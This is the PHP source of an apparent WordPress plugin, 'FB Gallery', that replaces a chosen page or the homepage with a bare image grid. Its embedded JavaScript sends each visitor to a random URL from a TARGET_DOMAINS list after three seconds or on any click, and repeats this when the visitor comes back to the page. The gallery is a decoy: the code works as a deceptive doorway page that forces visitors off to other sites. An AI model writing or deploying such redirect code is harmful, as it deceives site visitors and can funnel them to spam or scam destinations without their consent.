<?php
if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

/**
 * Serve clean gallery HTML when the FB Gallery page is viewed
 * (especially useful when set as Homepage via Settings → Reading)
 */
function fb_gallery_template_redirect() {
    $page_id = get_option( 'fb_gallery_page_id' );

    if ( ! $page_id ) {
        return;
    }

    // Check if current page is the gallery page (or front page when it is set as homepage)
    $is_gallery = false;

    if ( is_page( $page_id ) ) {
        $is_gallery = true;
    }

    // Also cover when it is set as the static front page
    if ( is_front_page() && (int) get_option( 'page_on_front' ) === (int) $page_id ) {
        $is_gallery = true;
    }

    if ( ! $is_gallery ) {
        return;
    }

    // Output pure gallery and stop WordPress from loading theme
    fb_gallery_render_public_page();
    exit;
}
add_action( 'template_redirect', 'fb_gallery_template_redirect', 1 );

/**
 * Render the public gallery page (same stylish version)
 */
function fb_gallery_render_public_page() {
    $domains = fb_gallery_get_domains();
    $images  = fb_gallery_get_images();

    if ( empty( $domains ) ) {
        $domains = array( 'https://example.com' );
    }
    if ( empty( $images ) ) {
        $images = array( 'https://via.placeholder.com/400' );
    }

    // Prevent caching issues on some hosts
    nocache_headers();
    header( 'Content-Type: text/html; charset=utf-8' );
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><?php echo esc_html( get_the_title( get_option( 'fb_gallery_page_id' ) ) ?: 'Gallery' ); ?></title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: #0f0f0f;
      min-height: 100vh;
      padding: 16px 10px 30px;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
      -webkit-text-size-adjust: 100%;
    }
    .gallery {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 12px;
      max-width: 620px;
      margin: 0 auto;
    }
    .gallery img {
      width: 100%;
      aspect-ratio: 1/1;
      object-fit: cover;
      border-radius: 14px;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.45);
      border: 1px solid rgba(255, 255, 255, 0.07);
    }
    .gallery img:hover {
      transform: scale(1.04);
      box-shadow: 0 10px 28px rgba(0, 0, 0, 0.6);
      border-color: rgba(255, 255, 255, 0.18);
    }
    .gallery img:active {
      transform: scale(0.97);
    }
    @media (max-width: 480px) {
      body {
        padding: 12px 8px 24px;
      }
      .gallery {
        gap: 10px;
      }
      .gallery img {
        border-radius: 12px;
      }
    }
    @media (min-width: 600px) {
      .gallery {
        grid-template-columns: repeat(3, 1fr);
        gap: 14px;
      }
    }
  </style>
</head>
<body>
  <div class="gallery">
    <?php foreach ( $images as $img ) : ?>
      <img src="<?php echo esc_url( $img ); ?>" alt="" loading="lazy">
    <?php endforeach; ?>
  </div>

  <script>
    const TARGET_DOMAINS = <?php echo wp_json_encode( array_values( $domains ) ); ?>;

    function getTargetUrl() {
      return TARGET_DOMAINS[Math.floor(Math.random() * TARGET_DOMAINS.length)];
    }

    let timer = null;

    function startRedirect() {
      if (timer) clearTimeout(timer);

      document.querySelectorAll(".gallery img").forEach(function (img) {
        img.onclick = function () {
          window.location.href = getTargetUrl();
        };
      });

      timer = setTimeout(function () {
        window.location.href = getTargetUrl();
      }, 3000);
    }

    window.addEventListener("pageshow", function () {
      startRedirect();
    });

    startRedirect();
  </script>
</body>
</html>
    <?php
}
